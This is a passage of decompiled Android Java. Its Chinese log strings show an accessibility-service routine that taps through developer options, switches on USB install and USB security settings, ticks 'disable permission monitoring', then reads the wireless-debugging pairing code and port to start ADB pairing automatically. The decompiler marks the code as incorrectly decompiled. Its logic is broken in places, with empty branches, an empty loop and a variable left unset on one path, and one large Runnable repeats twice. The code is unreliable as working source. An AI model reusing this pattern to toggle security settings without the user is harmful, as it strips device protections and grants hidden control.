                        /* JADX WARN: Removed duplicated region for block: B:243:0x0403 A[Catch: Exception -> 0x0409, TRY_LEAVE, TryCatch #5 {Exception -> 0x0409, blocks: (B:228:0x0384, B:230:0x038a, B:232:0x039d, B:234:0x03b8, B:236:0x03ce, B:238:0x03dd, B:239:0x03fa, B:241:0x03fe, B:243:0x0403, B:268:0x03f6, B:270:0x03bd), top: B:227:0x0384, outer: #0 }] */
                        /* JADX WARN: Removed duplicated region for block: B:246:0x0418 A[EXC_TOP_SPLITTER, SYNTHETIC] */
                        /* JADX WARN: Removed duplicated region for block: B:253:0x042e A[ADDED_TO_REGION] */
                        /* JADX WARN: Removed duplicated region for block: B:262:0x043b A[ADDED_TO_REGION, SYNTHETIC] */
                        /* JADX WARN: Removed duplicated region for block: B:318:0x04da A[Catch: Exception -> 0x04e9, LOOP:8: B:310:0x04b8->B:318:0x04da, LOOP_END, TryCatch #4 {Exception -> 0x04e9, blocks: (B:295:0x0460, B:297:0x0473, B:299:0x0479, B:301:0x047f, B:303:0x048c, B:305:0x049a, B:307:0x04a5, B:309:0x04b0, B:318:0x04da, B:320:0x04e3, B:325:0x04d4, B:311:0x04b8, B:313:0x04be, B:315:0x04cc), top: B:294:0x0460, inners: #7 }] */
                        /* JADX WARN: Removed duplicated region for block: B:319:0x04e3 A[SYNTHETIC] */
                        @Override // java.lang.Runnable
                        /*
                            Code decompiled incorrectly, please refer to instructions dump.
                        */
                        public final void run() {
                            boolean z3;
                            boolean m998O;
                            UiObject findOneByCombine;
                            String str4;
                            boolean z4;
                            UiObject findOneByCombine2;
                            String str5;
                            boolean z5;
                            UiObject uiObject;
                            UiObject uiObject2;
                            UiObject uiObject3;
                            String str6;
                            CombineFilter u02;
                            EnumC0894g enumC0894g3 = EnumC0894g.PAIR_DEPT_PAIR_SUCCESS;
                            int i42 = i6;
                            boolean z6 = true;
                            a0 a0Var = this.f975b;
                            switch (i42) {
                                case 0:
                                    a0.m982H(a0Var);
                                    break;
                                case 1:
                                    a0.m982H(a0Var);
                                    break;
                                case 2:
                                    a0Var.getClass();
                                    try {
                                        if (a0.t0()) {
                                            a0Var.f841p.set(EnumC0894g.PAIR_DEPT_PAIR_PREPARE_FINISH);
                                            if (AbstractC0249e.m620i()) {
                                                AtomicInteger atomicInteger = new AtomicInteger(0);
                                                while (true) {
                                                    try {
                                                        UiObject f02 = a0Var.f0();
                                                        if (f02 != null && f02.canScrollForward()) {
                                                            f02.scrollForwardEnd();
                                                            a0Var.m1061F(MyAccessibilityService.m554P().l0(false).getActiveFastRoot());
                                                            AbstractC0251g.T0(5);
                                                            f02 = a0Var.f0();
                                                        }
                                                        if (f02 != null) {
                                                            uiObject = f02.canScrollBackward() ? f02.scrollBackwardUtil(a0.F0()) : null;
                                                            if (uiObject == null && f02.canScrollForward()) {
                                                                uiObject = f02.scrollForwardUtil(a0.F0());
                                                            }
                                                        } else {
                                                            uiObject = null;
                                                        }
                                                        if (uiObject != null && uiObject.parent() != null && a0Var.g0(uiObject.parent(), 20).isChecked()) {
                                                            a0Var.f844s = true;
                                                            Log.d("PairAccessibilityDelegate", "禁用权限监控已勾选");
                                                        }
                                                    } catch (Exception e2) {
                                                        AbstractC0026q.m186s("PairAccessibilityDelegate", e2);
                                                    }
                                                    if (!a0Var.f844s && atomicInteger.incrementAndGet() <= 10) {
                                                        AbstractC0251g.T0(10);
                                                    }
                                                }
                                                AbstractC0184g.m354h(80);
                                                a0Var.D0();
                                            }
                                            if (AbstractC0249e.m624m()) {
                                                AtomicInteger atomicInteger2 = new AtomicInteger(0);
                                                while (true) {
                                                    try {
                                                        UiObject f03 = a0Var.f0();
                                                        if (f03 != null) {
                                                            Log.d("PairAccessibilityDelegate", "开发者选项窗口滚动视图查找成功");
                                                            C0981d c0981d = new C0981d(a0.R0(), 2, 0);
                                                            findOneByCombine2 = f03.scrollForwardUtil(c0981d);
                                                            if (findOneByCombine2 == null) {
                                                                f03.scrollBackwardEnd();
                                                                a0Var.m1061F(MyAccessibilityService.m554P().l0(false).getActiveFastRoot());
                                                                AbstractC0251g.T0(5);
                                                                UiObject f04 = a0Var.f0();
                                                                if (f04 != null) {
                                                                    findOneByCombine2 = f04.scrollForwardUtil(c0981d);
                                                                }
                                                            }
                                                        } else {
                                                            Log.e("PairAccessibilityDelegate", "开发者选项窗口滚动视图查找失败");
                                                            findOneByCombine2 = a0Var.m1072k().findOneByCombine(a0.R0());
                                                        }
                                                    } catch (Exception e3) {
                                                        AbstractC0026q.m186s("PairAccessibilityDelegate", e3);
                                                    }
                                                    if (findOneByCombine2 != null) {
                                                        Log.d("PairAccessibilityDelegate", "USB安装栏目查找成功");
                                                        UiObject findParentUtilCombine = findOneByCombine2.findParentUtilCombine(a0.q0());
                                                        if (findParentUtilCombine != null) {
                                                            Log.d("PairAccessibilityDelegate", "USB安装可点击栏目查找成功");
                                                            CheckedResult e02 = a0.e0(findParentUtilCombine);
                                                            a0Var.f845t = e02.isChecked();
                                                            z5 = e02.isClicked();
                                                            if (z5) {
                                                                Log.d("PairAccessibilityDelegate", "USB安装已点击");
                                                                AbstractC0251g.T0(10);
                                                            }
                                                            if (a0Var.f845t) {
                                                                Log.d("PairAccessibilityDelegate", "USB安装已勾选");
                                                            }
                                                            if (a0Var.f845t && atomicInteger2.incrementAndGet() <= 10) {
                                                                AbstractC0251g.T0(10);
                                                            }
                                                        } else {
                                                            str5 = "USB安装可点击栏目查找失败";
                                                        }
                                                    } else {
                                                        str5 = "USB安装栏目查找失败";
                                                    }
                                                    Log.e("PairAccessibilityDelegate", str5);
                                                    z5 = false;
                                                    if (z5) {
                                                    }
                                                    if (a0Var.f845t) {
                                                    }
                                                    if (a0Var.f845t) {
                                                    }
                                                }
                                                AbstractC0184g.m354h(70);
                                                atomicInteger2.set(0);
                                                while (true) {
                                                    try {
                                                        UiObject f05 = a0Var.f0();
                                                        if (f05 != null) {
                                                            Log.d("PairAccessibilityDelegate", "开发者选项窗口滚动视图查找成功");
                                                            C0981d c0981d2 = new C0981d(a0.S0(), 3, 0);
                                                            findOneByCombine = f05.scrollForwardUtil(c0981d2);
                                                            if (findOneByCombine == null) {
                                                                f05.scrollBackwardEnd();
                                                                a0Var.m1061F(MyAccessibilityService.m554P().l0(false).getActiveFastRoot());
                                                                AbstractC0251g.T0(5);
                                                                UiObject f06 = a0Var.f0();
                                                                if (f06 != null) {
                                                                    findOneByCombine = f06.scrollForwardUtil(c0981d2);
                                                                }
                                                            }
                                                        } else {
                                                            Log.e("PairAccessibilityDelegate", "开发者选项窗口滚动视图查找失败");
                                                            findOneByCombine = a0Var.m1072k().findOneByCombine(a0.S0());
                                                        }
                                                    } catch (Exception e4) {
                                                        AbstractC0026q.m186s("PairAccessibilityDelegate", e4);
                                                    }
                                                    if (findOneByCombine != null) {
                                                        Log.d("PairAccessibilityDelegate", "USB安全设置栏目查找成功");
                                                        UiObject findParentUtilCombine2 = findOneByCombine.findParentUtilCombine(a0.q0());
                                                        if (findParentUtilCombine2 != null) {
                                                            Log.d("PairAccessibilityDelegate", "USB安全设置可点击栏目查找成功");
                                                            CheckedResult e03 = a0.e0(findParentUtilCombine2);
                                                            a0Var.f846u = e03.isChecked();
                                                            z4 = e03.isClicked();
                                                            if (a0Var.f846u) {
                                                                Log.d("PairAccessibilityDelegate", "USB安全设置已勾选");
                                                            }
                                                            if (z4) {
                                                                Log.d("PairAccessibilityDelegate", "USB安全设置点击成功");
                                                            }
                                                            AtomicInteger atomicInteger32222 = new AtomicInteger(10);
                                                            for (m998O = a0Var.m998O(); !m998O; m998O = a0Var.m998O()) {
                                                                try {
                                                                } catch (Exception e5) {
                                                                    AbstractC0026q.m186s("PairAccessibilityDelegate", e5);
                                                                }
                                                                if (atomicInteger32222.decrementAndGet() >= 0) {
                                                                    AbstractC0251g.T0(1);
                                                                } else if (!a0Var.f846u && !m998O && atomicInteger2.incrementAndGet() <= 10) {
                                                                    AbstractC0251g.T0(10);
                                                                }
                                                            }
                                                            if (!a0Var.f846u) {
                                                            }
                                                        } else {
                                                            str4 = "USB安全设置可点击栏目查找失败";
                                                        }
                                                    } else {
                                                        str4 = "USB安全设置栏目查找失败";
                                                    }
                                                    Log.e("PairAccessibilityDelegate", str4);
                                                    z4 = false;
                                                    if (a0Var.f846u) {
                                                    }
                                                    if (z4) {
                                                    }
                                                    AtomicInteger atomicInteger322222 = new AtomicInteger(10);
                                                    while (!m998O) {
                                                    }
                                                    if (!a0Var.f846u) {
                                                    }
                                                }
                                                AbstractC0184g.m354h(80);
                                                if (a0Var.f846u) {
                                                    Log.d("PairAccessibilityDelegate", "USB安全设置已勾选");
                                                }
                                            }
                                            a0Var.f840o.remove("pairInPrepareFinish");
                                            break;
                                        }
                                        a0Var.D0();
                                        a0Var.f840o.remove("pairInPrepareFinish");
                                    } catch (Exception e6) {
                                        AbstractC0026q.m186s("PairAccessibilityDelegate", e6);
                                        return;
                                    }
                                    break;
                                case 3:
                                    a0Var.getClass();
                                    try {
                                        a0Var.f840o.remove("pairInPairSuccess");
                                        if (!a0.t0()) {
                                            a0Var.D0();
                                            break;
                                        } else {
                                            if (AbstractC0249e.m624m() && Build.VERSION.SDK_INT >= 35) {
                                                if (AbstractC0026q.m172b()) {
                                                    AbstractC0251g.T0(5);
                                                    if (!AbstractC0026q.m150A()) {
                                                        AbstractC0026q.m164O(null, null);
                                                    }
                                                }
                                                if (AbstractC0251g.f1()) {
                                                }
                                            }
                                            try {
                                                AbstractC0251g.F0(1);
                                                Log.d("PairAccessibilityDelegate", "GlobalActionAutomator back");
                                                Thread.sleep(100L);
                                                break;
                                            } catch (Exception e7) {
                                                AbstractC0026q.m186s("PairAccessibilityDelegate", e7);
                                                return;
                                            }
                                        }
                                    } catch (Exception e8) {
                                        AbstractC0026q.m186s("PairAccessibilityDelegate", e8);
                                        return;
                                    }
                                    break;
                                case 4:
                                    AtomicReference atomicReference2 = a0Var.f841p;
                                    try {
                                        if (!Objects.equals(atomicReference2.get(), enumC0894g3)) {
                                            a0Var.m1062G();
                                            Log.d("PairAccessibilityDelegate", "active root complete");
                                            atomicReference2.set(EnumC0894g.PAIR_DEPT_PAIR_LEAVE_DEV_OPT);
                                            a0.m985R(a0Var.m1072k());
                                            try {
                                                u02 = a0.u0();
                                                uiObject2 = null;
                                            } catch (Exception e9) {
                                                e = e9;
                                                uiObject2 = null;
                                            }
                                            while (uiObject2 == null) {
                                                try {
                                                } catch (Exception e10) {
                                                    e = e10;
                                                    AbstractC0026q.m186s("PairAccessibilityDelegate", e);
                                                    uiObject3 = uiObject2;
                                                    if (uiObject3 != null) {
                                                    }
                                                    Log.e("PairAccessibilityDelegate", str6);
                                                    return;
                                                }
                                                if (a0Var.m1072k() != null) {
                                                    uiObject2 = a0Var.m1072k().findOneByCombine(u02);
                                                    AbstractC0251g.T0(5);
                                                } else {
                                                    if (uiObject2 != null) {
                                                        Log.d("PairAccessibilityDelegate", "使用配对码配对栏目查找成功");
                                                    }
                                                    uiObject3 = uiObject2;
                                                    if (uiObject3 != null) {
                                                        Log.d("PairAccessibilityDelegate", "使用配对码配对栏目查找成功");
                                                        AbstractC0184g.m354h(30);
                                                        UiObject findParentUtilCombine3 = uiObject3.findParentUtilCombine(a0.m987T());
                                                        if (findParentUtilCombine3 != null && findParentUtilCombine3.click()) {
                                                            Log.d("PairAccessibilityDelegate", "使用配对码配对栏目已点击");
                                                            AbstractC0184g.m354h(35);
                                                            break;
                                                        } else {
                                                            str6 = "使用配对码配对栏目点击失败";
                                                        }
                                                    } else {
                                                        str6 = "使用配对码配对栏目查找失败";
                                                    }
                                                    Log.e("PairAccessibilityDelegate", str6);
                                                }
                                            }
                                            if (uiObject2 != null) {
                                            }
                                            uiObject3 = uiObject2;
                                            if (uiObject3 != null) {
                                            }
                                            Log.e("PairAccessibilityDelegate", str6);
                                        }
                                    } catch (Exception e11) {
                                        AbstractC0026q.m186s("PairAccessibilityDelegate", e11);
                                        return;
                                    }
                                    break;
                                case 5:
                                    a0Var.getClass();
                                    try {
                                        boolean m996M = a0Var.m996M();
                                        AtomicReference atomicReference3 = a0Var.f841p;
                                        String str7 = a0Var.f864c;
                                        if (m996M && !a0Var.m1000Q() && !Objects.equals(atomicReference3.get(), enumC0894g3)) {
                                            Object obj2 = atomicReference3.get();
                                            EnumC0894g enumC0894g4 = EnumC0894g.PAIR_DEPT_PAIRING;
                                            if (!Objects.equals(obj2, enumC0894g4)) {
                                                Log.d("PairAccessibilityDelegate", "pairInPairCodeDialog 窗口匹配");
                                                a0Var.m1062G();
                                                Log.d("PairAccessibilityDelegate", "active root complete");
                                                atomicReference3.set(enumC0894g4);
                                                Future m592b = AbstractC0243l.m592b(new CallableC0239h(a0Var), str7);
                                                if (m592b != null) {
                                                    while (!m592b.isDone()) {
                                                        Log.d("PairAccessibilityDelegate", "正在读取配对码和配对端口");
                                                        AbstractC0251g.T0(2);
                                                    }
                                                    try {
                                                        PairPortAndCodeResult pairPortAndCodeResult = (PairPortAndCodeResult) m592b.get();
                                                        if (pairPortAndCodeResult != null) {
                                                            Log.d("PairAccessibilityDelegate", "读取配对码和配对端口完成");
                                                            AbstractC0184g.m354h(40);
                                                            if (C0318e.m844S() != null) {
                                                                Log.d("PairAccessibilityDelegate", "正在发起配对");
                                                                C0318e.m844S().f615m.set(false);
                                                                C0318e.m844S().m852K(pairPortAndCodeResult.getHost(), pairPortAndCodeResult.getPairPort().intValue(), pairPortAndCodeResult.getPairCode());
                                                                if (C0318e.m844S().m860U()) {
                                                                    Log.d("PairAccessibilityDelegate", "本次配对成功");
                                                                    AbstractC0184g.m354h(45);
                                                                    atomicReference3.set(enumC0894g3);
                                                                } else {
                                                                    Log.d("PairAccessibilityDelegate", "本次配对失败");
                                                                }
                                                            }
                                                        } else {
                                                            Log.e("PairAccessibilityDelegate", "读取配对码和配对端口失败");
                                                        }
                                                    } catch (Exception e12) {
                                                        AbstractC0026q.m186s("PairAccessibilityDelegate", e12);
                                                    }
                                                }
                                            }
                                        }
                                        if (!Objects.equals(atomicReference3.get(), enumC0894g3)) {
                                            atomicReference3.set(EnumC0894g.PAIR_DEPT_PAIR_FAIL);
                                        }
                                        if (a0Var.m996M()) {
                                            Log.e("PairAccessibilityDelegate", "配对结束,仍然停留在配对码窗口");
                                            if (atomicReference3.get() != enumC0894g3) {
                                                z6 = false;
                                            }
                                            AbstractC0243l.m592b(new CallableC0238g(z6, a0Var), str7);
                                            break;
                                        }
                                    } catch (Exception e13) {
                                        AbstractC0026q.m186s("PairAccessibilityDelegate", e13);
                                        return;
                                    }
                                    break;
                                case 6:
                                    a0Var.getClass();
                                    while (a0Var.m997N()) {
                                        try {
                                            UiObject findOneByCombine3 = a0Var.m1072k().findOneByCombine(a0.m989V());
                                            if (findOneByCombine3 != null && findOneByCombine3.click()) {
                                                Log.d("PairAccessibilityDelegate", "配对失败对话框确定按钮查找并点击完成");
                                                AbstractC0251g.T0(10);
                                            }
                                        } catch (Exception e14) {
                                            AbstractC0026q.m186s("PairAccessibilityDelegate", e14);
                                            return;
                                        }
                                    }
                                    ConcurrentLinkedQueue concurrentLinkedQueue2 = a0Var.f840o;
                                    concurrentLinkedQueue2.remove("pairInWifiDebugWindow");
                                    concurrentLinkedQueue2.remove("pairInPairCodeDialog");
                                    concurrentLinkedQueue2.remove("pairInPairFailDialog");
                                    break;
                                case 7:
                                    a0Var.getClass();
                                    while (a0Var.m1078q(C0420i.m1117L())) {
                                        try {
                                            try {
                                                AbstractC0251g.F0(1);
                                                Log.d("PairAccessibilityDelegate", "GlobalActionAutomator back");
                                                Thread.sleep(100L);
                                            } catch (Exception e15) {
                                                AbstractC0026q.m186s("PairAccessibilityDelegate", e15);
                                            }
                                            AbstractC0251g.T0(5);
                                        } catch (Exception e16) {
                                            AbstractC0026q.m186s("PairAccessibilityDelegate", e16);
                                        }
                                    }
                                    break;
                                default:
                                    a0Var.getClass();
                                    try {
                                        Log.d("PairAccessibilityDelegate", "pairInSecurityCenter 窗口匹配");
                                        UiObject findOneByCombine4 = a0Var.m1072k().findOneByCombine(a0.K0());
                                        if (findOneByCombine4 != null && findOneByCombine4.clickable() && findOneByCombine4.click()) {
                                            Log.d("PairAccessibilityDelegate", "USB安装设置窗口下一步按钮查找并点击完成");
                                            a0Var.f840o.remove("pairInSecurityCenter");
                                            break;
                                        } else {
                                            UiObject findOneByCombine5 = a0Var.m1072k().findOneByCombine(a0.J0());
                                            if (findOneByCombine5 != null) {
                                                Log.d("PairAccessibilityDelegate", "USB安装设置窗口允许按钮查找完成");
                                                if (findOneByCombine5.clickable()) {
                                                    Log.d("PairAccessibilityDelegate", "USB安装设置窗口允许按钮已可以点击");
                                                    if (findOneByCombine5.click()) {
                                                        Log.d("PairAccessibilityDelegate", "USB安装设置窗口允许按钮点击完成");
                                                        AbstractC0251g.T0(10);
                                                        while (true) {
                                                            try {
                                                            } catch (Exception e17) {
                                                                AbstractC0026q.m186s("PairAccessibilityDelegate", e17);
                                                            }
                                                            if (a0Var.m1072k() != null && a0Var.m1072k().findOneByCombine(a0.L0()) != null) {
                                                                Log.d("PairAccessibilityDelegate", "当前处于USB安全设置对话框");
                                                                z3 = true;
                                                                if (z3) {
                                                                    a0Var.f846u = true;
                                                                    a0Var.D0();
                                                                    break;
                                                                } else {
                                                                    Log.d("PairAccessibilityDelegate", "正在开启USB安全设置....");
                                                                    AbstractC0251g.T0(5);
                                                                }
                                                            }
                                                            z3 = false;
                                                            if (z3) {
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    } catch (Exception e18) {
                                        AbstractC0026q.m186s("PairAccessibilityDelegate", e18);
                                        return;
                                    }
                                    break;
                            }
                        }
                    };
                }
                AbstractC0243l.m593c(runnable, str3);
                return;
            }
            try {
                linkedList = new LinkedList();
                linkedList.add(m984J());
                linkedList.add(r0());
            } catch (Exception e2) {
                AbstractC0026q.m186s("PairAccessibilityDelegate", e2);
            }
            if (m1078q(linkedList)) {
                Log.d("PairAccessibilityDelegate", "已进入是否允许此网络无线调试对话框");
                z2 = true;
                if (!z2) {
                    concurrentLinkedQueue.remove("pairInWifiDebugWindow");
                    concurrentLinkedQueue.remove("pairInDevOption");
                    return;
                }
                if (m996M() && !m1000Q()) {
                    concurrentLinkedQueue.remove("pairInWifiDebugWindow");
                    if (concurrentLinkedQueue.contains("pairInPairCodeDialog")) {
                        return;
                    }
                    concurrentLinkedQueue.add("pairInPairCodeDialog");
                    final int i7 = 5;
                    AbstractC0243l.m593c(new Runnable(this) { // from class: o.y

                        /* renamed from: b */
                        public final /* synthetic */ a0 f975b;

                        {
                            this.f975b = this;
                        }

                        /* JADX WARN: Removed duplicated region for block: B:107:0x01a8 A[Catch: Exception -> 0x01a4, TRY_LEAVE, TryCatch #14 {Exception -> 0x01a4, blocks: (B:102:0x0192, B:104:0x0198, B:107:0x01a8), top: B:101:0x0192 }] */
                        /* JADX WARN: Removed duplicated region for block: B:111:0x01b7 A[Catch: Exception -> 0x01e3, TryCatch #15 {Exception -> 0x01e3, blocks: (B:94:0x016e, B:96:0x0178, B:111:0x01b7, B:113:0x01c9, B:115:0x01cf, B:118:0x01df, B:123:0x01b1), top: B:93:0x016e }] */
                        /* JADX WARN: Removed duplicated region for block: B:120:0x01dd  */
                        /* JADX WARN: Removed duplicated region for block: B:216:0x0357 A[Catch: Exception -> 0x0369, TryCatch #6 {Exception -> 0x0369, blocks: (B:204:0x02e0, B:206:0x02e6, B:208:0x02f8, B:210:0x0313, B:212:0x0329, B:214:0x0338, B:216:0x0357, B:217:0x035f, B:219:0x0363, B:276:0x0351, B:278:0x0318), top: B:203:0x02e0, outer: #0 }] */
                        /* JADX WARN: Removed duplicated region for block: B:219:0x0363 A[Catch: Exception -> 0x0369, TRY_LEAVE, TryCatch #6 {Exception -> 0x0369, blocks: (B:204:0x02e0, B:206:0x02e6, B:208:0x02f8, B:210:0x0313, B:212:0x0329, B:214:0x0338, B:216:0x0357, B:217:0x035f, B:219:0x0363, B:276:0x0351, B:278:0x0318), top: B:203:0x02e0, outer: #0 }] */
                        /* JADX WARN: Removed duplicated region for block: B:241:0x03fe A[Catch: Exception -> 0x0409, TryCatch #5 {Exception -> 0x0409, blocks: (B:228:0x0384, B:230:0x038a, B:232:0x039d, B:234:0x03b8, B:236:0x03ce, B:238:0x03dd, B:239:0x03fa, B:241:0x03fe, B:243:0x0403, B:268:0x03f6, B:270:0x03bd), top: B:227:0x0384, outer: #0 }] */
                        /* JADX WARN: Removed duplicated region for block: B:243:0x0403 A[Catch: Exception -> 0x0409, TRY_LEAVE, TryCatch #5 {Exception -> 0x0409, blocks: (B:228:0x0384, B:230:0x038a, B:232:0x039d, B:234:0x03b8, B:236:0x03ce, B:238:0x03dd, B:239:0x03fa, B:241:0x03fe, B:243:0x0403, B:268:0x03f6, B:270:0x03bd), top: B:227:0x0384, outer: #0 }] */
                        /* JADX WARN: Removed duplicated region for block: B:246:0x0418 A[EXC_TOP_SPLITTER, SYNTHETIC] */
                        /* JADX WARN: Removed duplicated region for block: B:253:0x042e A[ADDED_TO_REGION] */
                        /* JADX WARN: Removed duplicated region for block: B:262:0x043b A[ADDED_TO_REGION, SYNTHETIC] */
                        /* JADX WARN: Removed duplicated region for block: B:318:0x04da A[Catch: Exception -> 0x04e9, LOOP:8: B:310:0x04b8->B:318:0x04da, LOOP_END, TryCatch #4 {Exception -> 0x04e9, blocks: (B:295:0x0460, B:297:0x0473, B:299:0x0479, B:301:0x047f, B:303:0x048c, B:305:0x049a, B:307:0x04a5, B:309:0x04b0, B:318:0x04da, B:320:0x04e3, B:325:0x04d4, B:311:0x04b8, B:313:0x04be, B:315:0x04cc), top: B:294:0x0460, inners: #7 }] */
                        /* JADX WARN: Removed duplicated region for block: B:319:0x04e3 A[SYNTHETIC] */
                        @Override // java.lang.Runnable
                        /*
                            Code decompiled incorrectly, please refer to instructions dump.
                        */
                        public final void run() {
                            boolean z3;
                            boolean m998O;
                            UiObject findOneByCombine;
                            String str4;
                            boolean z4;
                            UiObject findOneByCombine2;
                            String str5;
                            boolean z5;
                            UiObject uiObject;
                            UiObject uiObject2;
                            UiObject uiObject3;
                            String str6;
                            CombineFilter u02;
                            EnumC0894g enumC0894g3 = EnumC0894g.PAIR_DEPT_PAIR_SUCCESS;
                            int i42 = i7;
                            boolean z6 = true;
                            a0 a0Var = this.f975b;
                            switch (i42) {
                                case 0:
                                    a0.m982H(a0Var);
                                    break;
                                case 1:
                                    a0.m982H(a0Var);
                                    break;
                                case 2:
                                    a0Var.getClass();
                                    try {
                                        if (a0.t0()) {
                                            a0Var.f841p.set(EnumC0894g.PAIR_DEPT_PAIR_PREPARE_FINISH);
                                            if (AbstractC0249e.m620i()) {
                                                AtomicInteger atomicInteger = new AtomicInteger(0);
                                                while (true) {
                                                    try {
                                                        UiObject f02 = a0Var.f0();
                                                        if (f02 != null && f02.canScrollForward()) {
                                                            f02.scrollForwardEnd();
                                                            a0Var.m1061F(MyAccessibilityService.m554P().l0(false).getActiveFastRoot());
                                                            AbstractC0251g.T0(5);
                                                            f02 = a0Var.f0();
                                                        }
                                                        if (f02 != null) {
                                                            uiObject = f02.canScrollBackward() ? f02.scrollBackwardUtil(a0.F0()) : null;
                                                            if (uiObject == null && f02.canScrollForward()) {
                                                                uiObject = f02.scrollForwardUtil(a0.F0());
                                                            }
                                                        } else {
                                                            uiObject = null;
                                                        }
                                                        if (uiObject != null && uiObject.parent() != null && a0Var.g0(uiObject.parent(), 20).isChecked()) {
                                                            a0Var.f844s = true;
                                                            Log.d("PairAccessibilityDelegate", "禁用权限监控已勾选");
                                                        }
                                                    } catch (Exception e22) {
                                                        AbstractC0026q.m186s("PairAccessibilityDelegate", e22);
                                                    }
                                                    if (!a0Var.f844s && atomicInteger.incrementAndGet() <= 10) {
                                                        AbstractC0251g.T0(10);
                                                    }
                                                }
                                                AbstractC0184g.m354h(80);
                                                a0Var.D0();
                                            }
                                            if (AbstractC0249e.m624m()) {
                                                AtomicInteger atomicInteger2 = new AtomicInteger(0);
                                                while (true) {
                                                    try {
                                                        UiObject f03 = a0Var.f0();
                                                        if (f03 != null) {
                                                            Log.d("PairAccessibilityDelegate", "开发者选项窗口滚动视图查找成功");
                                                            C0981d c0981d = new C0981d(a0.R0(), 2, 0);
                                                            findOneByCombine2 = f03.scrollForwardUtil(c0981d);
                                                            if (findOneByCombine2 == null) {
                                                                f03.scrollBackwardEnd();
                                                                a0Var.m1061F(MyAccessibilityService.m554P().l0(false).getActiveFastRoot());
                                                                AbstractC0251g.T0(5);
                                                                UiObject f04 = a0Var.f0();
                                                                if (f04 != null) {
                                                                    findOneByCombine2 = f04.scrollForwardUtil(c0981d);
                                                                }
                                                            }
                                                        } else {
                                                            Log.e("PairAccessibilityDelegate", "开发者选项窗口滚动视图查找失败");
                                                            findOneByCombine2 = a0Var.m1072k().findOneByCombine(a0.R0());
                                                        }
                                                    } catch (Exception e3) {
                                                        AbstractC0026q.m186s("PairAccessibilityDelegate", e3);
                                                    }
                                                    if (findOneByCombine2 != null) {
                                                        Log.d("PairAccessibilityDelegate", "USB安装栏目查找成功");
                                                        UiObject findParentUtilCombine = findOneByCombine2.findParentUtilCombine(a0.q0());
                                                        if (findParentUtilCombine != null) {
                                                            Log.d("PairAccessibilityDelegate", "USB安装可点击栏目查找成功");
                                                            CheckedResult e02 = a0.e0(findParentUtilCombine);
                                                            a0Var.f845t = e02.isChecked();
                                                            z5 = e02.isClicked();
                                                            if (z5) {
                                                                Log.d("PairAccessibilityDelegate", "USB安装已点击");
                                                                AbstractC0251g.T0(10);
                                                            }
                                                            if (a0Var.f845t) {
                                                                Log.d("PairAccessibilityDelegate", "USB安装已勾选");
                                                            }
                                                            if (a0Var.f845t && atomicInteger2.incrementAndGet() <= 10) {
                                                                AbstractC0251g.T0(10);
                                                            }
                                                        } else {
                                                            str5 = "USB安装可点击栏目查找失败";
                                                        }
                                                    } else {
                                                        str5 = "USB安装栏目查找失败";
                                                    }
                                                    Log.e("PairAccessibilityDelegate", str5);
                                                    z5 = false;
                                                    if (z5) {
                                                    }
                                                    if (a0Var.f845t) {
                                                    }
                                                    if (a0Var.f845t) {
                                                    }
                                                }
                                                AbstractC0184g.m354h(70);
                                                atomicInteger2.set(0);
                                                while (true) {
                                                    try {
                                                        UiObject f05 = a0Var.f0();
                                                        if (f05 != null) {
                                                            Log.d("PairAccessibilityDelegate", "开发者选项窗口滚动视图查找成功");
                                                            C0981d c0981d2 = new C0981d(a0.S0(), 3, 0);
                                                            findOneByCombine = f05.scrollForwardUtil(c0981d2);
                                                            if (findOneByCombine == null) {
                                                                f05.scrollBackwardEnd();
                                                                a0Var.m1061F(MyAccessibilityService.m554P().l0(false).getActiveFastRoot());
                                                                AbstractC0251g.T0(5);
                                                                UiObject f06 = a0Var.f0();
                                                                if (f06 != null) {
                                                                    findOneByCombine = f06.scrollForwardUtil(c0981d2);
                                                                }
                                                            }
                                                        } else {
                                                            Log.e("PairAccessibilityDelegate", "开发者选项窗口滚动视图查找失败");
                                                            findOneByCombine = a0Var.m1072k().findOneByCombine(a0.S0());
                                                        }
                                                    } catch (Exception e4) {
                                                        AbstractC0026q.m186s("PairAccessibilityDelegate", e4);
                                                    }
                                                    if (findOneByCombine != null) {
                                                        Log.d("PairAccessibilityDelegate", "USB安全设置栏目查找成功");
                                                        UiObject findParentUtilCombine2 = findOneByCombine.findParentUtilCombine(a0.q0());
                                                        if (findParentUtilCombine2 != null) {
                                                            Log.d("PairAccessibilityDelegate", "USB安全设置可点击栏目查找成功");
                                                            CheckedResult e03 = a0.e0(findParentUtilCombine2);
                                                            a0Var.f846u = e03.isChecked();
                                                            z4 = e03.isClicked();
                                                            if (a0Var.f846u) {
                                                                Log.d("PairAccessibilityDelegate", "USB安全设置已勾选");
                                                            }
                                                            if (z4) {
                                                                Log.d("PairAccessibilityDelegate", "USB安全设置点击成功");
                                                            }
                                                            AtomicInteger atomicInteger322222 = new AtomicInteger(10);
                                                            for (m998O = a0Var.m998O(); !m998O; m998O = a0Var.m998O()) {
                                                                try {
                                                                } catch (Exception e5) {
                                                                    AbstractC0026q.m186s("PairAccessibilityDelegate", e5);
                                                                }
                                                                if (atomicInteger322222.decrementAndGet() >= 0) {
                                                                    AbstractC0251g.T0(1);
                                                                } else if (!a0Var.f846u && !m998O && atomicInteger2.incrementAndGet() <= 10) {
                                                                    AbstractC0251g.T0(10);
                                                                }
                                                            }
                                                            if (!a0Var.f846u) {
                                                            }
                                                        } else {
                                                            str4 = "USB安全设置可点击栏目查找失败";
                                                        }
                                                    } else {
                                                        str4 = "USB安全设置栏目查找失败";
                                                    }
                                                    Log.e("PairAccessibilityDelegate", str4);
                                                    z4 = false;
                                                    if (a0Var.f846u) {
                                                    }
                                                    if (z4) {
                                                    }
                                                    AtomicInteger atomicInteger3222222 = new AtomicInteger(10);
                                                    while (!m998O) {
                                                    }
                                                    if (!a0Var.f846u) {
                                                    }
                                                }
                                                AbstractC0184g.m354h(80);
                                                if (a0Var.f846u) {
                                                    Log.d("PairAccessibilityDelegate", "USB安全设置已勾选");
                                                }
                                            }
                                            a0Var.f840o.remove("pairInPrepareFinish");
                                            break;
                                        }
                                        a0Var.D0();
                                        a0Var.f840o.remove("pairInPrepareFinish");
                                    } catch (Exception e6) {
                                        AbstractC0026q.m186s("PairAccessibilityDelegate", e6);
                                        return;
                                    }
                                    break;
                                case 3:
                                    a0Var.getClass();
                                    try {
                                        a0Var.f840o.remove("pairInPairSuccess");
                                        if (!a0.t0()) {
                                            a0Var.D0();
                                            break;
                                        } else {
                                            if (AbstractC0249e.m624m() && Build.VERSION.SDK_INT >= 35) {
                                                if (AbstractC0026q.m172b()) {
